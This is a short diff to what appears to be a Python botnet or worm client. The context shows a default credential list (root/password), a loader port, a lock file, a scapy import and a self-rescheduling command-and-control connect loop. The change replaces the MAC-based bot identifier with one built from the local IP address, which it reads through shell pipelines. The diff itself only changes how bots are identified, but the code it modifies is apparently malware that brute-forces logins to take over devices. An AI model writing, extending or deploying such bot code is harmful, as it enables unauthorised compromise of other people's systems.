@@ -14,8 +14,6 @@ import sys
 
 from random import randint, choice, shuffle
 from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP
-from uuid import getnode as get_mac
-
 
 try:
     MOD_ACTUAL_IP = sys.argv[1]
@@ -34,7 +32,7 @@ LOADER_PORT = 8000
 MY_IP = "0.0.0.0"
 LOCK_FILE = '/tmp/b'
 
-MODULE = 'bot_'+str(get_mac())
+MODULE = 'bot_'
 
 CRED_LIST = [
     ("root","password"),
@@ -408,6 +406,16 @@ async def comm_connect():
         await asyncio.sleep(2)
         asyncio.ensure_future(comm_connect())
 
+def get_my_ip():
+    global MY_IP, MODULE
+    f = os.popen("ip a | grep 'scope global' | awk '{ print $NF }'")
+    local_eth = f.read().rstrip()
+    f = os.popen('ifconfig {} | grep "inet" | cut -d: -f2 | cut -d" " -f1'.format(local_eth))
+    # Keep some verifier, see the returned item is ok or not.
+    MY_IP = f.read().rstrip()
+    MODULE = 'bot_'+MY_IP
+
+get_my_ip()
 
 signal.signal(signal.SIGHUP, signal.SIG_IGN)
 signal.signal(signal.SIGINT, int_handler)
